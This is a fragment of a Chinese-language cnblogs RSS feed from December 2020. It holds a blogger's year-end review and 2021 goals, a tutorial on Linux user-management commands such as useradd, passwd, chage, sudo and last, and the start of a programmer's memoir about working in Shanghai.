&lt;/blockquote&gt;
</description>
<pubDate>Wed, 30 Dec 2020 23:40:00 +0000</pubDate>
<dc:creator>程序员欣宸</dc:creator>
<og:description>欢迎访问我的GitHub https://github.com/zq2599/blog_demos 内容：所有原创文章分类汇总及配套源码，涉及Java、Docker、Kubernetes、DevOPS</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/bolingcavalry/p/14214399.html</dc:identifier>
</item>
<item>
<title>niceyoo的2020年终总结-2021年Flag - niceyoo</title>
<link>http://www.cnblogs.com/niceyoo/p/14214326.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/niceyoo/p/14214326.html</guid>
<description>&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span class=&quot;content&quot;&gt;碎碎念，向本命年说再见！&lt;/span&gt;&lt;/h3&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;又到了一年一度立 Flag 的时间了，怎么样，去年的 Flag 大家实现的怎么样？还有信心立下 2021 年的 Flag 吗~&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;今年我算比较背的，年初的一次小意外，直接在床上躺了2月，年假硬生生过成了寒假，又重新体验了把学生的瘾。好在因为疫情，即便没有这次意外，也要在家待着。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;其实我不太信本命年一说，我把这次意外归结于自己的不小心。正所谓不如意事常八九，在工作几个月后，公司因为疫情原因一直处于拖薪状态，最终我因为房租的压力不得已选择了辞职，此后就开始了讨薪之路，一直到这个月才把所有工资勉强要完。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在这件事后我买了红色内衣、红袜子、红手链等跟本命年相关的物品辟邪，之后的行事也比较低调，一切以稳定为出发点，重大事情经朋友给与参考意见后决定，希望明年要本命年的小伙伴引以为戒。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;往年我写年终总结是比较积极的，今年却怎么也不想提笔。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;刚刚看了老罗的一条《2021年Flag》相关的抖音短视频，里面有句话特别感触，“人不怕立 Flag，就怕没有 Flag“，得嘞，关闭手里的抖音，年终总结 + 新年 Flag 走起。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;同去年一样，今年我的发文主要是在博客园，CSDN里的文章则主要是自动同步，粗略统计了一下，2020年我在博客园发布了约 100 篇技术文章（不包含水文，计划是150+篇）&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这一年博客园新增加 172 位关注，感谢。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这一年CSDN新增加 54 位关注，感谢。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;2019年的年终总结我说，2019或许是自己最艰难的一年，无论是生活还是职场，期间一度迷茫想放弃继续写博客... 很显然 19 年相对于 2020 年真的不算什么，好在有大家的关注，多少给了自己一直坚持的理由。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;下面主要回顾一下2020年的计划完成情况，以及对2021的新年Flag。&lt;/p&gt;
&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span class=&quot;content&quot;&gt;回顾2020年计划完成情况&lt;/span&gt;&lt;/h3&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;1、不低于150+文章【&lt;span&gt;未完成&lt;/span&gt;】&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;2、博客园150+关注【&lt;span&gt;已完成&lt;/span&gt;】&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;3、三本技术书籍 【&lt;span&gt;未完成&lt;/span&gt;】&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;4、公众号关注2K 【&lt;span&gt;已完成&lt;/span&gt;】&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;5、坚持副业发展 【&lt;span&gt;已完成&lt;/span&gt;】&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;6、毕业两年的大专生程序员工作总结(java后台) 【&lt;span&gt;已完成&lt;/span&gt;】&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;7、变幽默，新的文章风格 【&lt;span&gt;已完成&lt;/span&gt;】&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;给自己打个分，满分10分，打 7 分，未完成的又要移步到2021年了。。&lt;/p&gt;
&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span class=&quot;content&quot;&gt;2021年Flag&lt;/span&gt;&lt;/h3&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;1、CSDN 申请博客专家，开始好好在 CSDN 写一下文章&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;2、博客园总人数达到500关注&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;3、坚持副业发展，2021年攒20万&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;4、毕业三年的大专生程序员工作总结，明年7月15完成，纪念三周年&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;5、三本技术书籍&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;6、&lt;strong&gt;小伟后端笔记&lt;/strong&gt;公众号达到5000关注&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;7、一次旅游&lt;/p&gt;
&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span class=&quot;content&quot;&gt;这一年的一点感触&lt;/span&gt;&lt;/h3&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这一年得益于写文章，结识了不少小伙伴，微信好友从以前的300，来到了现在的2K+。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;与之相应的，从以前的秒回消息，到现在的半天或者一天+回复消息，甚至有时候忘记回消息，以至于再次回复时已经被对方拉黑。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;有时候难免玻璃心，最近看到 java3y 朋友圈也有发这种被拉黑情况，所以多少有点释然了。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;接触人多了后，感触比较深的是学会表达的重要性，首先我是比较欠缺这一块的，所以一直靠写文章来锻炼自己，试图让自己的话让读者看明白，但是有相当一部分小伙伴可能并没有注意到自己的表达，不限于：&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;1、在吗？&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;2、老铁在吗，为什么我的不行啊？+报错截图&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;3、为什么安装不了啊&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;4、....&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;其实这些真的会让我很困扰，所以每次我都要发个「&lt;strong&gt;在的，你有什么问题吗&lt;/strong&gt;」，或者是「&lt;strong&gt;能发一下问题的原文吗&lt;/strong&gt;」、「&lt;strong&gt;你指的什么安装不了&lt;/strong&gt;」等等，希望我的感受能给大家提供一点思路，比如以后私信别人问题时可以先把问题的背景、你的尝试或你现在遇到的问题简单描述一下，我觉得这样对方会很高兴回答你的。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;最后，懂得感谢别人也很重要，不要被B站的下次一定养成一直白嫖的习惯，白嫖习惯了就会觉得对方就应该给你提供帮助，大家都是成年人，一句友好的感谢还是要有的~&lt;/p&gt;
</description>
<pubDate>Wed, 30 Dec 2020 17:41:00 +0000</pubDate>
<dc:creator>niceyoo</dc:creator>
<og:description>碎碎念，向本命年说再见！ 又到了一年一度立 Flag 的时间了，怎么样，去年的 Flag 大家实现的怎么样？还有信心立下 2021 年的 Flag 吗~ 今年我算比较背的，年初的一次小意外，直接在床上</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/niceyoo/p/14214326.html</dc:identifier>
</item>
<item>
<title>Liunx运维(七)-用户管理及用户信息查询命令 - Mrwhite86</title>
<link>http://www.cnblogs.com/mrwhite2020/p/14187033.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/mrwhite2020/p/14187033.html</guid>
<description>&lt;p&gt;文档目录：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t01&quot;&gt;一、useradd：创建用户&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t02&quot;&gt;二、usermod：修改用户信息&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t03&quot;&gt;三、userdel：删除用户&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t04&quot;&gt;四、groupadd：创建新的用户组&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t05&quot;&gt;五、groupdel：删除用户组&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t06&quot;&gt;六、passwd：修改用户密码&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t07&quot;&gt;七、chage：修改用户密码有效期&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t08&quot;&gt;八、chpasswd：批量更新用户密码&lt;/a&gt;(备注1：密码测试问题)&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t09&quot;&gt;九、su:切换用户&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t10&quot;&gt;十、visudo：编辑sudoers文件&lt;/a&gt;（备注2：权限测试问题）&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t11&quot;&gt;十一、sudo：以另一个用户身份执行命令&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t12&quot;&gt;十二、id：显示用户与用户组的信息&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t13&quot;&gt;十三、w：显示已登录用户信息&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t14&quot;&gt;十四、who：显示已登录用户信息&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t15&quot;&gt;十五、users：显示已登录用户&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t16&quot;&gt;十六、whoami：显示当前登录的用户名&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t17&quot;&gt;十七、last：显示用户登录列表&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t18&quot;&gt;十八、lastb：显示用户登录失败的记录&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mrwhite2020/p/14187033.html#t19&quot;&gt;十九、lastlog：显示所有用户的最近登录记录&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;---------------------------------------分割线：正文--------------------------------------------------------&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;一、useradd：创建用户&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、 useradd testuser03 #创建用户&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201228232526417-20460089.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 用户定义文件：/etc/login.defs&lt;/p&gt;
&lt;p&gt;用户默认配置文件：/etc/default/useradd&lt;/p&gt;
&lt;p&gt;2、useradd -g sa -u 901 testuser04 #创建testuser04属于sa组，uid为901&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201228234527566-676864979.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 3、useradd -M -s /sbin/nologin testuser05 # -M不创建家目录，-s指定用户登录后的shell，/sbin/nologin代表禁止登录，常用语Ngin、Mysql等服务&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201228235132434-289271062.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 4、useradd -u 809 -s /bin/sh -c SysUser -G root,sa -e '2020/12/31' -f 2 -d /home/inca5 inca5  #-c设置注释，-G设置多个用户组，-e到期日期，-f到期后永久停权日期，-d设置家目录&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201229000628233-155244123.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; passwd中inca5账户信息说明：账户名：账户密码：账户UID：账户组GID：用户说明：用户家目录：shell解释器&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201229000959866-506821279.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 5、useradd -D -s /bin/sh #修改默认登录shell&lt;/p&gt;
&lt;p&gt; useradd -D -e '2020/12/31' #修改账户的有效期&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201229232637027-2100478178.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; useradd -D功能可以使用 vim /etc/default/useradd编辑来替代&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;二、usermod：修改用户信息&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、usermod -u 888 -s /sbin/nologin -c TmpUser -G root,sa -e '2020/12/31' -f 30 -d /home/inca inca #修改inca账户的uid为888，用户组，shell类型，家目录，过期日期，停权日&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201229233639839-1297752446.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;三、userdel：删除用户&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、userdel zuma #删除zuma用户&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201229233935590-1006044768.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 2、userdel -r zuma2 #-r删除用户并且删除对应家目录&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201229234245980-1902411263.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;四、groupadd：创建新的用户组&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、groupadd -g 123 test1 #添加一个gid为123的test1用户组&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201229234552906-633979541.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;五、groupdel：删除用户组&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;groupdel test1 #删除test1用户组成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201229234856740-1046692561.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;六、passwd：修改用户密码&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、passwd #修改当前用户密码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201229235403804-327649885.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 2、passwd inca3 #为inca3用户添加密码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201229235639643-1635994331.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;  3、passwd -S inca3 #显示账户密码信息，只能root下执行&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201229235851399-753939909.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 4、echo 'helloworld2020'|passwd --stdin inca3 # --stdin命令可以从标准输入获取密码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201230000053724-1287019698.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 5、passwd -n 7 -x 60 -w 10 -i 30 inca3 #设置inca3账户,-n修改密码最短天数-x修改密码最长天数-w密码过期前警告的天数-i密码过期后禁止登录天数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231005129793-460632051.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt; 七、chage：修改用户密码有效期&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、chage -m 7 -M 60 -W 10 -I 30 inca3 #修改账户-m，最小密码可更改时间，-M密码保持有效最大天数 -W 警告提前通知天数 -I过期后禁用天数&lt;/p&gt;
&lt;p&gt;2、chage -m7 -M60 -W10 -I30 inca3 #同上，第二种写法&lt;/p&gt;
&lt;p&gt;3、chage -l inca3 #查看账户信息&lt;/p&gt;
&lt;p&gt;4、chage -l inca3 #查看变更信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231005402246-1682669265.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt; 八、chpasswd：批量更新用户密码&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、chpasswd #回车后输入用户名输入密码批量更新，ctrl+d结束&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231005833226-1794088933.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 2、chpasswd &amp;lt; pass.txt #批量设置密码，通过读取文件数据&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231010111415-1269670009.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt; 九、su:切换用户&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、su #等同于 su root 未切换环境变量&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231010904116-1859687272.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 2、su - root #第二种切换方式，标准规范，切环境变量&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231011035500-1578831519.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt; 十、visudo：编辑sudoers文件&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、visudo #等同于 vim /etc/sudoers ,推荐vi方式比较安全&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231011320860-1941788338.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2、 visudo -c #语法检查&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231011429668-1897993287.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt; 十一、sudo：以另一个用户身份执行命令&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;sudo ls /root #通过root用户查看（可使用sudo配置中NOPASSWD）&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;十二、id：显示用户与用户组的信息&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;id baikang #查看用户信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231012053820-973619559.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt; 十三、w：显示已登录用户信息&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、w #已经登陆的用户信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231012141485-1785427697.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 2、w -h #去除两行标题&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231012202014-1203723756.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt; 十四、who：显示已登录用户信息&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、who #显示用户信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231012306337-733909750.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 2、who -b #用户启动时间&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231012333625-1101429036.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 3、who -d #已退出用户&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231012408253-952100623.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 4、who -l #显示登陆的进程&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231012432540-1144344699.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 5、who -H -a #显示最全登录信息，-H标题&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231012529899-1841732609.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt; 十五、users：显示已登录用户&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231012600656-802637968.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt; 十六、whoami：显示当前登录的用户名&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231012756260-316140660.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt; 十七、last：显示用户登录列表&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、last -10 #执行显示行数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231012925137-1900536166.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;  2、last inca3 #指定用户，记录空&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231013003213-131606047.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt; 十八、lastb：显示用户登录失败的记录&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231013046395-1382257397.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;十九、lastlog：显示所有用户的最近登录记录&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202012/1767782-20201231013124508-1128643611.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

</description>
<pubDate>Wed, 30 Dec 2020 17:40:00 +0000</pubDate>
<dc:creator>Mrwhite86</dc:creator>
<og:description>文档目录： 一、useradd：创建用户 二、usermod：修改用户信息 三、userdel：删除用户 四、groupadd：创建新的用户组 五、groupdel：删除用户组 六、passwd：修改</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/mrwhite2020/p/14187033.html</dc:identifier>
</item>
<item>
<title>分享一个普通程序员的“沪漂”六年的历程以及感想 - 程序员老猫</title>
<link>http://www.cnblogs.com/kdaddy/p/14214095.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kdaddy/p/14214095.html</guid>
<description>&lt;h3 id=&quot;开篇&quot;&gt;开篇&lt;/h3&gt;
&lt;p&gt;没错，标题中沪漂六年的程序员就是我，老猫。2020年即将结束，这也是老猫在上海的第六个年头，回想一路磕磕碰碰，到而今总算在上海有个落脚的地儿，老猫想和大家分享一下这段历程。&lt;/p&gt;
&lt;h3 id=&quot;初来乍到&quot;&gt;初来乍到&lt;/h3&gt;
&lt;p&gt;14年，老猫刚从南京的一所高校毕业，同学们大都选择留在了南京，老猫贯彻一向的杀马特作风，就是追求标新立异，来到了魔都上海。其实当时也想得比较简单，大上海机会多一些，另外的上海距离自己的老家会稍微近一点（老家南通），更重要的是老猫单身，来去自由。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;住所：住的是川杨新苑的群租房，房租比较便宜1250一个月，房间虽然小了些，但是冰箱洗衣机等等该有的都有。&lt;/li&gt;
&lt;li&gt;通勤：永远忘不了金科路附近的浦东12路公交有多么拥挤，一般不厚点脸皮，不多使点力气，等个三四班车都上不去。当然后来开了窍自己花了600元在闲鱼上买了工作之后的第一辆二手小电驴，感觉美滋滋。&lt;/li&gt;
&lt;li&gt;社交：虽然一个人来的上海，但是老猫的社交能力还算可以，一个月之内结交了几个不错的基友，包括到现在都打得火热的那种。那时候，单身，双休日一般就是宅家里和远在南京的老铁一起开黑LOL，要么就是约上基友去附近玩桌球，或者打篮球，日子也是过得自在。&lt;/li&gt;
&lt;li&gt;辛酸：每次回到住处就很孤独，住的地方也就一个人，所以也就对下班回去没有太大的期待，因为毕竟在公司还有个能聊天的活人。记得最最辛酸的一次是下班回去的时候发现住的地方被凿了一个大洞，当时就蒙圈了，后来才知道其实是为了整改群租房，被社区的人给砸了，无奈，连夜找房子，找房到搬家完毕折腾到下半夜，还好第二天是双休日。南京的朋友劝我回南京，因为毕竟还能和认识四年多的基友一起租房，南京的压力可能也没有那么大。当时有点动摇，后来碍于面子，想着回去的话不就是魔都混不下去回到二线了么。于是咬牙坚持了下来。&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;跳槽脱单&quot;&gt;跳槽脱单&lt;/h3&gt;
